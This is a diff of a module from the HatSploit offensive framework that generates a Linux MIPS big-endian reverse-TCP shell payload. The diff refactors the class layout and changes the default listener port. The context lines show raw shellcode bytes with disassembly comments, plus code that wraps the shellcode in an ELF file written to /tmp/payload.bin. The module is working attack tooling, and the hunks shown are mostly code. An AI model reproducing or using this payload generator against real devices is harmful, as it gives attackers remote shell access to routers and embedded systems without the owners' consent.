@@ -24,69 +24,68 @@
 # SOFTWARE.
 #
 
-from core.cli.badges import badges
-from core.cli.parser import parser
+from core.lib.module import HatSploitModule
 
 from utils.tcp_tools import tcp_tools
 from utils.hatvenom import hatvenom
 
-class HatSploitModule:
-    def __init__(self):
-        self.badges = badges()
-        self.parser = parser()
+class HatSploitModule(HatSploitModule):
+    tcp_tools = tcp_tools()
+    hatvenom = hatvenom()
 
-        self.tcp_tools = tcp_tools()
-        self.hatvenom = hatvenom()
-        
-        self.details = {
-            'Name': "Linux mipsbe Shell Reverse TCP",
-            'Module': "payload/linux/mipsbe/shell_reverse_tcp",
-            'Authors': [
-                'enty8080'
-            ],
-            'Description': "Shell Reverse TCP Payload for Linux mipsbe.",
-            'Dependencies': [
-                ''
-            ],
-            'Comments': [
-                ''
-            ],
-            'Risk': "low"
+    details = {
+        'Name': "Linux mipsbe Shell Reverse TCP",
+        'Module': "payload/linux/mipsbe/shell_reverse_tcp",
+        'Authors': [
+            'enty8080'
+        ],
+        'Description': "Shell Reverse TCP Payload for Linux mipsbe.",
+        'Dependencies': [
+            ''
+        ],
+        'Comments': [
+            ''
+        ],
+        'Risk': "low"
+    }
+
+    options = {
+        'LHOST': {
+            'Description': "Local host.",
+            'Value': tcp_tools.get_local_host(),
+            'Type': "ip",
+            'Required': True
+        },
+        'LPORT': {
+            'Description': "Local port.",
+            'Value': 8888,
+            'Type': "port",
+            'Required': True
+        },
+        'FORMAT': {
+            'Description': "Output format.",
+            'Value': "elf",
+            'Type': None,
+            'Required': True
+        },
+        'LPATH': {
+            'Description': "Local path.",
+            'Value': "/tmp/payload.bin",
+            'Type': None,
+            'Required': True
         }
-        
-        self.options = {
-            'LHOST': {
-                'Description': "Local host.",
-                'Value': self.tcp_tools.get_local_host(),
-                'Required': True
-            },
-            'LPORT': {
-                'Description': "Local port.",
-                'Value': 4444,
-                'Required': True
-            },
-            'FORMAT': {
-                'Description': "Output format.",
-                'Value': "elf",
-                'Required': True
-            },
-            'LPATH': {
-                'Description': "Local path.",
-                'Value': "/tmp/payload.bin",
-                'Required': True
-            }
-        }
-        
+    }
+
     def run(self):
         local_host, local_port, file_format, local_file = self.parser.parse_options(self.options)
-        
+
         local_host = self.hatvenom.host_to_bytes(local_host)
         local_port = self.hatvenom.port_to_bytes(local_port)
-        
+
         if not file_format in self.hatvenom.formats.keys():
             self.badges.output_error("Invalid format!")
             return
-        
+
         self.badges.output_process("Generating shellcode...")
         shellcode = (
             b"\x28\x04\xff\xff" +            # slti     a0,zero,-1
@@ -139,10 +138,10 @@ class HatSploitModule:
             b"\x24\x02\x0f\xab" +            # li       v0,4011
             b"\x00\x90\x93\x4c"              # syscall  0x2424d
         )
-        
+
         self.badges.output_process("Generating payload...")
         payload = self.hatvenom.generate(file_format, 'mipsbe', shellcode)
-        
+
         self.badges.output_process("Saving to " + local_file + "...")
         with open(local_file, 'wb') as f:
             f.write(payload)
